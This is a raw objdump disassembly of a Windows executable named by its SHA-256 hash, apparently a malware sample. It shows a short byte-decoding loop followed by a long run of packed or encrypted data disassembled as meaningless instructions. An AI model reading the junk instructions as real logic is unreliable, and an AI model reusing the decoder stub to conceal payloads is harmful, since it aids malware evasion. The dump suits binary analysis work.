
38449ed1e7c7b9f637e81a30bd1deeca0f64cea0917fc9741bcc4c7a7c24d68d.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	push   ecx
  411001:	push   ebp
  411002:	mov    ebp,DWORD PTR [esp+0x10]
  411006:	xor    eax,eax
  411008:	test   ebp,ebp
  41100a:	push   esi
  41100b:	mov    DWORD PTR [esp+0x8],eax
  41100f:	mov    esi,0xfffffffd
  411014:	je     0x41107a
  411016:	push   ebx
  411017:	push   edi
  411018:	mov    edi,DWORD PTR [esp+0x18]
  41101c:	mov    DWORD PTR [esp+0x1c],0x1
  411024:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  411028:	add    esi,0x2
  41102b:	inc    esi
  41102c:	mov    BYTE PTR [esi+edi*1],cl
  41102f:	mov    ecx,DWORD PTR [esp+0x24]
  411033:	movzx  ecx,BYTE PTR [eax+ecx*1]
  411037:	mov    edx,DWORD PTR [esp+0x10]
  41103b:	mov    eax,DWORD PTR [esp+0x1c]
  41103f:	add    edx,eax
  411041:	mov    DWORD PTR [esp+0x10],edx
  411045:	ror    eax,cl
  411047:	mov    eax,DWORD PTR [esp+0x10]
  41104b:	mov    edx,eax
  41104d:	shr    edx,0x3
  411050:	mov    ebx,0x1
  411055:	sub    ebx,edx
  411057:	imul   eax,ebx
  41105a:	mov    DWORD PTR [esp+0x10],eax
  41105e:	shl    ebx,0x3
  411061:	mov    bl,BYTE PTR [esi+edi*1]
  411064:	add    bl,cl
  411066:	mov    ecx,DWORD PTR [esp+0x20]
  41106a:	mov    BYTE PTR [esi+edi*1],bl
  41106d:	sub    esi,0x2
  411070:	cmp    esi,ecx
  411072:	jl     0x411024
  411074:	pop    edi
  411075:	pop    ebx
  411076:	pop    esi
  411077:	pop    ebp
  411078:	pop    ecx
  411079:	ret    
  41107a:	xor    eax,DWORD PTR [edi+0x77]
  41107d:	(bad)  
  41107e:	pushf  
  41107f:	ins    DWORD PTR es:[edi],dx
  411080:	ins    BYTE PTR es:[edi],dx
  411081:	sbb    al,0xfa
  411083:	cmp    BYTE PTR [eax+0x25ab6e50],al
  411089:	pushf  
  41108a:	push   ebx
  41108b:	jae    0x4110f8
  41108d:	dec    edx
  41108e:	cmp    DWORD PTR ds:[ecx],esi
  411091:	out    0x7c,eax
  411093:	lods   eax,DWORD PTR ds:[esi]
  411094:	cdq    
  411095:	imul   eax,DWORD PTR [esi+0x57],0x22
  411099:	cmp    al,0xa2
  41109b:	int    0xac
  41109d:	mov    ch,0xf3
  41109f:	dec    ebx
  4110a0:	jnp    0x411077
  4110a2:	out    dx,al
  4110a3:	or     bl,ch
  4110a5:	lock out dx,al
  4110a7:	adc    al,0xc7
  4110a9:	leave  
  4110aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110ab:	jl     0x41107b
  4110ad:	fst    QWORD PTR [esi-0x25122128]
  4110b3:	rcl    al,1
  4110b5:	push   ebx
  4110b6:	lods   al,BYTE PTR ds:[si]
  4110b8:	xchg   esi,eax
  4110b9:	mov    bh,0x4d
  4110bb:	call   0x50c0:0x72f7642b
  4110c2:	enter  0xf05c,0x6a
  4110c6:	xchg   BYTE PTR [ecx-0x59],bl
  4110c9:	push   ebp
  4110ca:	or     ebx,DWORD PTR [edx-0x4e]
  4110cd:	fdivr  DWORD PTR [ecx-0x25]
  4110d0:	sbb    esp,DWORD PTR [ebx+0x140f8bde]
  4110d6:	mov    ds:0x8b36a726,al
  4110db:	jecxz  0x411110
  4110dd:	loopne 0x41111d
  4110df:	sbb    BYTE PTR [edx+edx*4+0x52],al
  4110e3:	call   0xbd1e:0x13c52593
  4110ea:	cwde   
  4110eb:	pop    edx
  4110ec:	or     DWORD PTR [eax+0x24c3f189],eax
  4110f2:	sahf   
  4110f3:	inc    ebp
  4110f4:	dec    edi
  4110f5:	loop   0x41113e
  4110f7:	mov    bl,0x9c
  4110f9:	sti    
  4110fa:	(bad)  
  4110fb:	int    0x9c
  4110fd:	mov    ebx,0x91fe92f0
  411102:	idiv   BYTE PTR [edi]
  411104:	xor    cl,bl
  411106:	xchg   edx,eax
  411107:	mov    edi,0x344aa6f6
  41110c:	mov    dh,0x0
  41110e:	mov    DWORD PTR [eax+0x42492fb],ebp
  411114:	pusha  
  411115:	sar    DWORD PTR [eax-0x4e],0x23
  411119:	mov    ebp,cs
  41111b:	jb     0x4110e2
  41111d:	jp     0x4110d8
  41111f:	mov    dl,0x97
  411121:	sub    al,0xbf
  411123:	add    DWORD PTR [eax-0x1bf339d4],ecx
  411129:	jl     0x411161
  41112b:	cdq    
  41112c:	sbb    eax,0xe7982580
  411131:	and    al,0x97
  411133:	xchg   BYTE PTR [edx],dl
  411135:	cmp    al,0xa5
  411137:	dec    ecx
  411138:	ret    0xa2ba
  41113b:	xchg   BYTE PTR [ebx+0x59aad618],bl
  411141:	lods   al,BYTE PTR ds:[esi]
  411142:	cld    
  411143:	xor    bh,BYTE PTR [edi-0x26]
  411146:	or     esi,DWORD PTR [esp+ebp*4+0x66]
  41114a:	cmp    cl,bl
  41114c:	stos   DWORD PTR es:[edi],eax
  41114d:	push   esp
  41114e:	or     esi,DWORD PTR [ebx+0x2c8f3d7d]
  411154:	mov    ?,eax
  411156:	sub    dl,BYTE PTR [edi-0x31]
  411159:	out    dx,eax
  41115a:	add    bh,BYTE PTR ds:0x493701
  411160:	inc    edx
  411161:	jp     0x41114a
  411163:	stos   BYTE PTR es:[edi],al
  411164:	retf   
  411165:	inc    ax
  411167:	es jns 0x411130
  41116a:	mov    edi,0xc501b059
  41116f:	xchg   edi,eax
  411170:	mov    dh,0x94
  411172:	fcmovb st,st(1)
  411174:	mov    bl,0xed
  411176:	test   al,0x60
  411178:	jmp    0x168e028e
  41117d:	jge    0x41119b
  41117f:	cmp    eax,DWORD PTR [esi-0x7b]
  411182:	xchg   bh,dh
  411184:	xchg   ebp,eax
  411185:	loope  0x41117d
  411187:	xchg   DWORD PTR [edx],ecx
  411189:	dec    esi
  41118a:	test   al,0xe1
  41118c:	div    DWORD PTR [ecx+0x45]
  41118f:	(bad)  
  411190:	pop    ds
  411191:	dec    ebp
  411192:	jbe    0x411117
  411194:	scas   al,BYTE PTR es:[edi]
  411195:	rol    DWORD PTR [ebp-0x27],1
  411198:	xchg   ebx,eax
  411199:	push   edx
  41119a:	mov    ds:0x70d4a23e,al
  41119f:	push   ss
  4111a0:	dec    DWORD PTR ds:0xafc18718
  4111a6:	mov    ebp,0x8da4b467
  4111ab:	dec    ebx
  4111ac:	jae    0x411204
  4111ae:	or     edi,0xd20cedd2
  4111b4:	jp     0x4111ca
  4111b6:	mov    dh,0x36
  4111b8:	sbb    al,0xbc
  4111ba:	shr    BYTE PTR [esi],0xa4
  4111bd:	mov    esi,0x64c14ab8
  4111c2:	fs xor eax,0xd513c8fa
  4111c8:	jmp    DWORD PTR [ebp-0x221959a7]
  4111ce:	pop    ebx
  4111cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111d0:	or     DWORD PTR [ebx],0xbb257dc5
  4111d6:	sub    bl,BYTE PTR [edx+0x1b0c9134]
  4111dc:	out    0x27,eax
  4111de:	sbb    BYTE PTR [ecx-0x63],ch
  4111e1:	sbb    cl,cl
  4111e3:	jno    0x41122d
  4111e5:	int    0x42
  4111e7:	retf   
  4111e8:	push   edx
  4111e9:	xchg   edi,eax
  4111ea:	dec    edi
  4111eb:	je     0x4111f8
  4111ed:	pop    ebp
  4111ee:	inc    DWORD PTR [ebp-0x6920f1]
  4111f4:	push   ecx
  4111f5:	retf   
  4111f6:	lds    edi,FWORD PTR [edi]
  4111f8:	add    eax,DWORD PTR [ebx]
  4111fa:	mov    bl,0xb9
  4111fc:	sub    BYTE PTR [edi],ah
  4111fe:	out    0xc0,eax
  411200:	(bad)  
  411201:	xlat   BYTE PTR ds:[ebx]
  411202:	paddd  mm6,QWORD PTR [eax-0x2902e2b0]
  411209:	(bad)  
  41120a:	out    0xf,eax
  41120c:	mov    ecx,0xa29e41c
  411211:	xchg   edi,eax
  411212:	lahf   
  411213:	dec    ecx
  411214:	pop    edx
  411215:	mov    edi,0xecdd2c3b
  41121a:	mov    edx,0xd5df61f4
  41121f:	cs inc eax
  411221:	lea    ebp,[ebx]
  411223:	push   esi
  411224:	inc    ebp
  411225:	mov    cl,0x93
  411227:	jge    0x41121c
  411229:	push   es
  41122a:	ja     0x41129d
  41122c:	sub    edx,DWORD PTR [edi+0x41dff6b8]
  411232:	out    dx,eax
  411233:	mov    bh,0x29
  411235:	mov    eax,0x795af4db
  41123a:	xchg   edx,eax
  41123b:	jnp    0x411293
  41123d:	jecxz  0x4112a5
  41123f:	jb     0x4112a4
  411241:	les    ecx,FWORD PTR [ebx+0x5b]
  411244:	and    DWORD PTR [edx],ecx
  411246:	add    eax,0x3a3a9342
  41124b:	jg     0x411227
  41124d:	inc    edi
  41124e:	pusha  
  41124f:	sbb    esp,ecx
  411251:	inc    esp
  411252:	sahf   
  411253:	lods   eax,DWORD PTR ds:[esi]
  411254:	xor    BYTE PTR [ebp-0x7973dc93],al
  41125a:	jmp    0xfc4a:0x30daf953
  411261:	aam    0x69
  411263:	inc    edi
  411264:	lods   eax,DWORD PTR ds:[esi]
  411265:	sub    ecx,DWORD PTR [bx+di]
  411268:	inc    esp
  411269:	test   eax,0xc501e9ca
  41126e:	adc    al,0x91
  411270:	sbb    al,0x3f
  411272:	add    ebx,DWORD PTR [ecx+0x43]
  411275:	mov    eax,ds:0xa65b9956
  41127a:	add    al,0x1a
  41127c:	in     al,0x4b
  41127e:	pop    es
  41127f:	cmc    
  411280:	push   eax
  411281:	or     ah,ch
  411283:	imul   edx,DWORD PTR [ebx+0x63],0xfffffffd
  411287:	add    BYTE PTR [ebp+0x14],dl
  41128a:	push   esi
  41128b:	data16 (bad) 
  41128d:	pop    ebx
  41128e:	lahf   
  41128f:	and    DWORD PTR [ebp+0x51d77060],eax
  411295:	jecxz  0x411290
  411297:	rcl    dl,cl
  411299:	retf   0x2917
  41129c:	and    DWORD PTR [ebx+eiz*2+0x5daeba88],0xffffffb2
  4112a4:	push   0xffffffba
  4112a6:	imul   esi,DWORD PTR [eax-0x7e],0xffffff8d
  4112aa:	in     eax,dx
  4112ab:	adc    al,0xe9
  4112ad:	xor    edi,eax
  4112af:	lea    ebp,[edx]
  4112b1:	repnz hlt 
  4112b3:	sub    BYTE PTR [edi+0x54],bl
  4112b6:	mov    al,ds:0x1063e003
  4112bb:	xor    ebp,ebp
  4112bd:	imul   edx,DWORD PTR [edi],0x53b0246c
  4112c3:	jmp    0x7214:0x1097cb15
  4112ca:	(bad)  
  4112cb:	xchg   edi,eax
  4112cc:	add    al,0xd4
  4112ce:	stos   DWORD PTR es:[edi],eax
  4112cf:	ficomp WORD PTR [edx+0x34]
  4112d2:	jns    0x411296
  4112d4:	push   ecx
  4112d5:	cmp    ecx,DWORD PTR [edi-0x4e7eb216]
  4112db:	sub    bl,BYTE PTR [edi+0x6107c820]
  4112e1:	fmul   DWORD PTR [esi-0x33]
  4112e4:	sub    al,0x6
  4112e6:	cwde   
  4112e7:	ins    BYTE PTR es:[edi],dx
  4112e8:	loop   0x41135b
  4112ea:	clc    
  4112eb:	push   eax
  4112ec:	aad    0xde
  4112ee:	adc    al,0x79
  4112f0:	dec    ecx
  4112f1:	xchg   esi,eax
  4112f2:	dec    ebp
  4112f3:	push   edx
  4112f4:	inc    ecx
  4112f5:	or     ecx,edx
  4112f7:	and    dh,BYTE PTR [edx-0x1cc20697]
  4112fd:	jno    0x4112d9
  4112ff:	(bad)
  411302:	mov    ah,0x33
  411304:	dec    esi
  411305:	fstp   TBYTE PTR [ebx+eax*4]
  411308:	mov    edi,0xd8dafd83
  41130d:	getsec 
  41130f:	aam    0xc9
  411311:	cli    
  411312:	pop    es
  411313:	loop   0x4112c3
  411315:	inc    esi
  411316:	adc    eax,ebp
  411318:	inc    eax
  411319:	mov    ch,0xa0
  41131b:	iret   
  41131c:	and    al,0x36
  41131e:	sbb    eax,0xac1e361
  411323:	imul   ebp,DWORD PTR [ebp+0xfa1f7d3],0x1e
  41132a:	inc    ebx
  41132b:	jp     0x41130b
  41132d:	jae    0x411358
  41132f:	clc    
  411330:	fimul  DWORD PTR ss:[eax]
  411333:	shl    BYTE PTR [edx+eax*2-0x3de9e6dc],0x9
  41133b:	push   eax
  41133c:	rcl    BYTE PTR [edx],cl
  41133e:	adc    al,0xd9
  411340:	jmp    0x4112ea
  411342:	pusha  
  411343:	xor    DWORD PTR [ebp-0x36939277],0xffffff80
  41134a:	rcl    esi,0x82
  41134d:	xor    al,0x7c
  41134f:	mov    edi,DWORD PTR [edi]
  411351:	xor    ebp,esi
  411353:	jge    0x41135c
  411355:	inc    ecx
  411356:	dec    ebx
  411357:	(bad)  
  411358:	mov    ecx,0xa964c056
  41135d:	add    eax,0x7da22c7f
  411362:	sub    eax,0xb08f8ae
  411367:	(bad)  
  411368:	loope  0x4113aa
  41136a:	mov    ch,0x1
  41136c:	test   DWORD PTR [edi],0x62676e1c
  411372:	loop   0x411389
  411374:	mov    eax,ds:0xf46e111a
  411379:	aad    0xe0
  41137b:	dec    esp
  41137c:	loopne 0x411356
  41137e:	mov    ebp,esi
  411380:	lahf   
  411381:	ror    BYTE PTR [ebp+0x527fb8f1],cl
  411387:	sub    BYTE PTR [ebp+0x1b],al
  41138a:	mov    ebx,esi
  41138c:	or     eax,0x1187f804
  411391:	mov    bl,0xfa
  411393:	leave  
  411394:	outs   dx,BYTE PTR ds:[esi]
  411395:	lahf   
  411396:	xchg   esp,eax
  411397:	jno    0x4113cb
  411399:	adc    ah,al
  41139b:	and    BYTE PTR [edx],0x95
  41139e:	and    al,BYTE PTR ds:0x37b61f16
  4113a4:	jne    0x41140b
  4113a6:	ja     0x41136b
  4113a8:	call   DWORD PTR [edx-0x44]
  4113ab:	rcr    BYTE PTR [edi-0x1e],1
  4113ae:	inc    edx
  4113af:	std    
  4113b0:	js     0x411429
  4113b2:	xchg   ebx,eax
  4113b3:	scas   al,BYTE PTR es:[edi]
  4113b4:	jno    0x411414
  4113b6:	mov    bl,0x8a
  4113b8:	dec    esi
  4113b9:	(bad)  
  4113bb:	sub    BYTE PTR [eax+eax*2+0x73317486],0x0
  4113c3:	mov    cl,0x9c
  4113c5:	mov    ds:0xffea7e20,eax
  4113ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113cb:	js     0x411447
  4113cd:	mov    al,ds:0x107e4ac3
  4113d2:	dec    esi
  4113d3:	test   cl,0x2a
  4113d6:	and    al,0xfb
  4113d8:	aaa    
  4113d9:	or     al,0xb9
  4113db:	rol    DWORD PTR [eax],cl
  4113dd:	pop    esp
  4113de:	xchg   esi,eax
  4113df:	lock mov al,ds:0xac14b745
  4113e5:	mov    edx,0x1884c34d
  4113ea:	pop    ecx
  4113eb:	pop    ss
  4113ec:	dec    ebp
  4113ed:	retf   
  4113ee:	jg     0x41137d
  4113f0:	jmp    0x3f1c0c03
  4113f5:	cwde   
  4113f6:	mov    esp,0x80a9dda8
  4113fb:	pop    edx
  4113fc:	inc    esi
  4113fd:	clc    
  4113fe:	dec    edi
  4113ff:	ja     0x411412
  411401:	add    edi,esp
  411403:	cwde   
  411404:	jge    0x411446
  411406:	fwait
  411407:	dec    edi
  411408:	mov    ss,WORD PTR [edi]
  41140a:	pop    esp
  41140b:	mov    ch,0x64
  41140d:	sbb    DWORD PTR ds:0xe01bc294,0x2e2de777
  411417:	pop    edx
  411418:	push   ecx
  411419:	pop    esi
  41141a:	inc    ecx
  41141b:	and    al,0x2
  41141d:	sbb    BYTE PTR [ebx+ebp*8-0x3ebfe15f],bl
  411424:	out    0xa,eax
  411426:	add    al,0x64
  411428:	inc    eax
  411429:	sub    dh,bh
  41142b:	ins    DWORD PTR es:[edi],dx
  41142c:	int3   
  41142d:	stc    
  41142e:	nop
  41142f:	repz and eax,0xf8a48cb6
  411435:	jnp    0x411414
  411437:	cmp    al,0x21
  411439:	in     eax,0xcd
  41143b:	jge    0x4113cb
  41143d:	test   eax,0x5d2f6174
  411442:	push   ss
  411443:	xor    eax,0x7c748151
  411448:	lods   al,BYTE PTR ds:[esi]
  411449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41144a:	xchg   edi,eax
  41144b:	pushf  
  41144c:	sub    eax,0xf7a836e3
  411451:	mov    ds:0xe52bc69b,al
  411456:	sbb    BYTE PTR [esp+ecx*4+0x0],ah
  41145a:	lahf   
  41145b:	enter  0x2fb0,0x80
  41145f:	repnz aas 
  411461:	enter  0x16c5,0xe3
  411465:	adc    DWORD PTR [edx+0x41],esp
  411468:	ds jae 0x41147b
  41146b:	mov    WORD PTR [eax-0x18],fs
  41146e:	fsub   st(6),st
  411470:	cmp    DWORD PTR [ecx],edi
  411472:	ins    BYTE PTR es:[edi],dx
  411473:	add    BYTE PTR [eax+0x403ad26],ch
  411479:	cmp    esi,DWORD PTR [ecx]
  41147b:	mov    al,ds:0xc258f902
  411480:	inc    esi
  411481:	jo     0x411467
  411483:	push   edi
  411484:	cwde   
  411485:	mov    bh,0x43
  411487:	cwde   
  411488:	push   0xb25471e7
  41148d:	cmp    eax,0xcf8fbaa7
  411492:	mov    DWORD PTR [edi+0x77],edx
  411495:	sub    edi,ebp
  411497:	mov    ch,0xa4
  411499:	mov    ds:0xe3989daa,eax
  41149e:	lea    edi,[esi]
  4114a0:	stos   BYTE PTR es:[edi],al
  4114a1:	jno    0x4114b3
  4114a3:	pop    edi
  4114a4:	scas   eax,DWORD PTR es:[edi]
  4114a5:	push   ebp
  4114a6:	(bad)  
  4114a7:	and    DWORD PTR [eax-0xc8f67fc],ecx
  4114ad:	cmc    
  4114ae:	sub    al,0x2f
  4114b0:	mov    eax,ds:0x43c2fb3d
  4114b5:	retf   0x3019
  4114b8:	push   es
  4114b9:	or     al,0x57
  4114bb:	inc    eax
  4114bc:	or     eax,0x9074b75
  4114c1:	mov    ebp,0xa259635b
  4114c6:	in     al,dx
  4114c7:	mov    edi,0x45dc8e9c
  4114cc:	xchg   ebp,eax
  4114cd:	adc    BYTE PTR cs:[edx-0x14],bl
  4114d1:	jle    0x4114c5
  4114d3:	xchg   BYTE PTR [edx+esi*8-0x7f],ah
  4114d7:	dec    DWORD PTR [eax+0x6b]
  4114da:	cmp    BYTE PTR [ebp+0x5],bl
  4114dd:	call   0x771c68d3
  4114e2:	repz add eax,0xb262f27a
  4114e8:	outs   dx,DWORD PTR ds:[esi]
  4114e9:	pop    esi
  4114ea:	xchg   esi,eax
  4114eb:	(bad)  
  4114ec:	mov    edi,0xb01b5ebc
  4114f1:	add    DWORD PTR [esi+0x2d62a226],esp
  4114f7:	ss jnp 0x4114ee
  4114fa:	jecxz  0x411484
  4114fc:	ss mov esi,0x342cc5ec
  411502:	xchg   esp,eax
  411503:	test   BYTE PTR [ecx-0x3e715346],ch
  411509:	or     eax,DWORD PTR [ebp+0x1]
  41150c:	mov    cs,WORD PTR [edx+0x2]
  41150f:	stc    
  411510:	sbb    al,0x3a
  411512:	adc    DWORD PTR [ecx+0x202ffffd],ebx
  411518:	add    eax,0xc5601a96
  41151d:	mov    ebp,0x9283d3d0
  411522:	rcl    DWORD PTR [edx+0x311bd41d],cl
  411528:	and    eax,0xcc9dbe7f
  41152d:	push   esi
  41152e:	sbb    bh,BYTE PTR [edi-0x37]
  411531:	push   eax
  411532:	sbb    eax,0x4c9a9b7d
  411537:	jle    0x4114ef
  411539:	push   esp
  41153a:	xchg   bh,cl
  41153c:	push   ds
  41153d:	mov    ch,0x17
  41153f:	dec    esp
  411540:	sbb    BYTE PTR [ebp-0x273a66f4],bl
  411546:	je     0x4115b3
  411548:	out    dx,eax
  411549:	sub    eax,ebp
  41154b:	popf   
  41154c:	stos   DWORD PTR es:[edi],eax
  41154d:	push   es
  41154e:	jns    0x4115a5
  411550:	call   0x7d30448f
  411555:	and    DWORD PTR [esi+0x401bf9e6],eax
  41155b:	stos   BYTE PTR es:[edi],al
  41155c:	imul   ebx,DWORD PTR [eax],0x95ecdc8e
  411562:	inc    esi
  411563:	shld   DWORD PTR [ebx+0x7d],eax,0xc4
  411568:	push   esi
  411569:	xchg   esi,eax
  41156a:	(bad)  
  41156b:	sub    esp,eax
  41156d:	(bad)  
  41156e:	cmp    eax,0xe2f8ce9
  411573:	sub    al,0x1
  411575:	inc    ebx
  411576:	xor    DWORD PTR [edx],0x24
  411579:	loopne 0x4115c3
  41157b:	(bad)  
  41157c:	popa   
  41157d:	pop    eax
  41157e:	push   ebp
  41157f:	mov    ebp,0xcf15866
  411584:	mov    dl,0x2d
  411586:	lea    ebp,[ebx+0x61]
  411589:	or     BYTE PTR [ebx+0x6a9c50a5],dl
  41158f:	cmp    eax,0xde2bcfcf
  411594:	hlt    
  411595:	cs pop ss
  411597:	loopne 0x4115e4
  411599:	adc    ebx,edi
  41159b:	inc    ebp
  41159c:	sahf   
  41159d:	mov    cl,al
  41159f:	jnp    0x411619
  4115a1:	pop    ss
  4115a2:	jmp    0xdd37:0x509b1627
  4115a9:	cmp    bh,dl
  4115ab:	inc    ebp
  4115ac:	lahf   
  4115ad:	pop    esp
  4115ae:	jnp    0x411593
  4115b0:	jg     0x41162b
  4115b2:	outs   dx,DWORD PTR ds:[esi]
  4115b3:	fwait
  4115b4:	cli    
  4115b5:	mov    ebx,DWORD PTR [eax-0x61]
  4115b8:	dec    esp
  4115b9:	cmp    al,0xee
  4115bb:	fcomp  QWORD PTR [edi+0x12]
  4115be:	aam    0x9c
  4115c0:	xor    ecx,esp
  4115c2:	push   eax
  4115c3:	sbb    DWORD PTR [eax-0x7c],ebp
  4115c6:	neg    DWORD PTR [esi]
  4115c8:	jae    0x411594
  4115ca:	dec    edx
  4115cb:	xor    al,0x89
  4115cd:	mov    eax,0xab53a7b2
  4115d2:	test   BYTE PTR [edx+0x770f06f8],0x24
  4115d9:	das    
  4115da:	adc    DWORD PTR [edx+0x22132066],esi
  4115e0:	out    dx,eax
  4115e1:	daa    
  4115e2:	imul   DWORD PTR [esi-0x45]
  4115e5:	mov    ah,BYTE PTR [ebx+0x36616f35]
  4115eb:	shl    ebp,1
  4115ed:	xor    eax,DWORD PTR [edx]
  4115ef:	cmp    ah,BYTE PTR [ebx-0x76]
  4115f2:	nop
  4115f3:	push   ecx
  4115f4:	daa    
  4115f5:	add    al,0xda
  4115f7:	mov    ecx,0x5fa94603
  4115fc:	cs adc eax,ebp
  4115ff:	xor    eax,0xbe381172
  411604:	adc    BYTE PTR [ecx+edi*1],0x59
  411608:	ror    BYTE PTR [ebx+0x63760ae2],1
  41160e:	mov    ecx,?
  411610:	sbb    DWORD PTR [esi+0x5e812cc2],0x3468df19
  41161a:	fadd   DWORD PTR [esi-0x7a]
  41161d:	mov    cl,0x13
  41161f:	or     dh,BYTE PTR [edx]
  411621:	and    BYTE PTR [ecx-0x3e],ch
  411624:	and    bl,dl
  411626:	mov    cl,0x9b
  411628:	popf   
  411629:	rcl    BYTE PTR [edx+0x1b],1
  41162c:	data16 mov cs,WORD PTR [edx-0x7c]
  411630:	sti    
  411631:	sbb    eax,edi
  411633:	sub    al,0xfb
  411635:	ss std 
  411637:	cld    
  411638:	mov    ds:0x38db91ab,al
  41163d:	inc    ecx
  41163e:	les    edi,FWORD PTR [eax+0x6f]
  411641:	outs   dx,DWORD PTR ds:[esi]
  411642:	ret    0x4036
  411645:	out    0xb4,al
  411647:	mov    dl,0x1f
  411649:	inc    edi
  41164a:	fild   DWORD PTR [edi+ecx*8+0x7f999dae]
  411651:	xor    DWORD PTR [edx+ebp*1-0x5],ecx
  411655:	fdivr  DWORD PTR [edi]
  411657:	jmp    0x411628
  411659:	(bad)  
  41165a:	or     eax,0x14385bb2
  41165f:	pushf  
  411660:	in     al,dx
  411661:	sub    BYTE PTR [esi+0x5b],al
  411664:	push   ss
  411665:	popf   
  411666:	aad    0xf2
  411668:	fdivr  DWORD PTR [ecx-0x397893f5]
  41166e:	jmp    0x411660
  411670:	scas   eax,DWORD PTR es:[edi]
  411671:	rcl    DWORD PTR [edx+0x77950a4c],cl
  411677:	push   eax
  411678:	fwait
  411679:	hlt    
  41167a:	mov    ds:0xa1ae9d45,al
  41167f:	test   esp,0x43189317
  411685:	and    DWORD PTR [esi+0x36910ceb],ebx
  41168b:	push   edx
  41168c:	fist   WORD PTR [ecx-0x78]
  41168f:	xchg   esp,eax
  411690:	hlt    
  411691:	inc    ebp
  411693:	mov    esi,0x3ab4a705
  411698:	std    
  411699:	or     al,0x27
  41169b:	cmp    ebp,0x42
  41169e:	retf   0x5ee5
  4116a1:	fsincos 
  4116a3:	lock jae 0x4116f2
  4116a6:	in     eax,dx
  4116a7:	jp     0x4116f0
  4116a9:	jle    0x41162c
  4116ab:	test   DWORD PTR [edi+0x40eabf3e],eax
  4116b1:	inc    esi
  4116b2:	aaa    
  4116b3:	xchg   DWORD PTR [eax-0x6cab10cb],ebp
  4116b9:	pop    es
  4116ba:	sbb    bh,ch
  4116bc:	or     al,0x9e
  4116be:	pop    edi
  4116bf:	mov    ?,WORD PTR [ebx+ebx*8+0x72]
  4116c3:	mov    BYTE PTR [esi+0x5a0cdf3c],ah
  4116c9:	into   
  4116ca:	rol    BYTE PTR [eax-0x52237a37],0x83
  4116d1:	pop    edx
  4116d2:	inc    ebx
  4116d3:	retf   
  4116d4:	inc    edi
  4116d5:	scas   eax,DWORD PTR es:[edi]
  4116d6:	sbb    eax,0xb771d833
  4116db:	imul   ebx,esp,0xf5284020
  4116e1:	cmp    al,dl
  4116e3:	add    edi,DWORD PTR [edi]
  4116e5:	clc    
  4116e6:	push   ds
  4116e7:	mov    edx,0xae422e54
  4116ec:	neg    BYTE PTR [edx+eiz*2+0xff21c1b]
  4116f3:	cld    
  4116f4:	in     eax,dx
  4116f5:	mov    bl,0x7d
  4116f7:	xchg   ebx,eax
  4116f8:	lds    ecx,FWORD PTR [ebp-0x61]
  4116fb:	cmp    ecx,DWORD PTR [edi+ecx*8]
  4116fe:	add    al,0x7b
  411700:	addr16 cs out 0x55,al
  411704:	sub    BYTE PTR [ecx],bl
  411706:	mov    BYTE PTR [ebp+0x6272dbfa],cl
  41170c:	push   0xd1a3a0b5
  411711:	sbb    edi,eax
  411713:	mov    ds:0x89d50ba9,al
  411718:	test   al,0x86
  41171a:	mov    edx,0x862c7ac2
  41171f:	rcr    BYTE PTR [esi],0x63
  411722:	in     eax,0x41
  411724:	fcmovnu st,st(2)
  411726:	outs   dx,DWORD PTR ds:[esi]
  411727:	and    BYTE PTR [edx-0x1e2fb290],0x25
  41172e:	sub    ah,BYTE PTR [ecx]
  411730:	pusha  
  411731:	imul   edx,DWORD PTR [edx],0x87973cf1
  411737:	xor    al,BYTE PTR [eax-0x72]
  41173a:	mov    esp,DWORD PTR [ebp-0x170948a1]
  411740:	into   
  411741:	add    eax,0x51ceb255
  411746:	mov    esp,0xfbe7b7a7
  41174b:	push   ds
  41174c:	and    DWORD PTR [edi+0x5a21e779],0xd14f71c4
  411756:	ret    
  411757:	xchg   esi,eax
  411758:	out    dx,eax
  411759:	fs push cs
  41175b:	xchg   BYTE PTR [esi],bl
  41175d:	dec    esi
  41175e:	mov    ebp,0xe512c82b
  411763:	xchg   ecx,eax
  411764:	out    dx,al
  411765:	fsub   DWORD PTR [ebx+0x7c]
  411768:	in     eax,dx
  411769:	sub    ah,BYTE PTR [ecx]
  41176b:	mov    ds:0xa9d486e,eax
  411770:	stc    
  411771:	mov    BYTE PTR [ecx],dh
  411773:	xchg   ecx,eax
  411774:	xlat   BYTE PTR ds:[ebx]
  411775:	adc    al,0x7c
  411777:	adc    eax,0x20e21d9
  41177c:	lea    eax,[edi-0x4]
  41177f:	push   cs
  411780:	fisub  DWORD PTR [eax]
  411782:	mov    esp,DWORD PTR [ebx-0x4f]
  411785:	(bad)  
  411787:	or     ah,BYTE PTR [edi+0x23017958]
  41178d:	xchg   ecx,eax
  41178e:	cmp    al,0x31
  411790:	jns    0x41178a
  411792:	or     ebx,DWORD PTR [ecx+0x3ac7673d]
  411798:	mov    bl,0xc4
  41179a:	stos   DWORD PTR es:[edi],eax
  41179b:	xchg   BYTE PTR [esi+0x41],bl
  41179e:	addr16 loope 0x411734
  4117a1:	dec    esi
  4117a2:	(bad)  
  4117a4:	outs   dx,DWORD PTR ds:[esi]
  4117a5:	pop    ebp
  4117a6:	pop    esi
  4117a7:	stos   BYTE PTR es:[edi],al
  4117a8:	nop
  4117a9:	add    BYTE PTR fs:[edx-0x3],cl
  4117ad:	or     al,0xbd
  4117af:	xchg   edi,eax
  4117b0:	lds    eax,FWORD PTR [ecx]
  4117b2:	mov    eax,ds:0x498b103c
  4117b7:	xor    bh,BYTE PTR [ebp+edi*4-0x4c0b9ebd]
  4117be:	ins    DWORD PTR es:[edi],dx
  4117bf:	imul   edi,DWORD PTR [esi],0xfcae30b8
  4117c5:	or     bh,dl
  4117c7:	or     ebp,ebx
  4117c9:	iret   
  4117ca:	fstp   QWORD PTR ss:[ecx]
  4117cd:	test   al,0x3c
  4117cf:	sbb    eax,0xafc3c381
  4117d4:	daa    
  4117d5:	push   edi
  4117d6:	sbb    esi,DWORD PTR [edi+0x50e798ef]
  4117dc:	lahf   
  4117dd:	dec    esi
  4117de:	fiadd  WORD PTR ds:0xc0afcb35
  4117e4:	clc    
  4117e5:	push   edi
  4117e6:	jmp    0x72fbc0a0
  4117eb:	push   esp
  4117ec:	retf   0xc587
  4117ef:	scas   al,BYTE PTR es:[edi]
  4117f0:	xchg   esi,eax
  4117f1:	dec    ecx
  4117f2:	jge    0x411873
  4117f4:	shr    DWORD PTR [ecx-0x1b7af7a7],1
  4117fa:	loope  0x411791
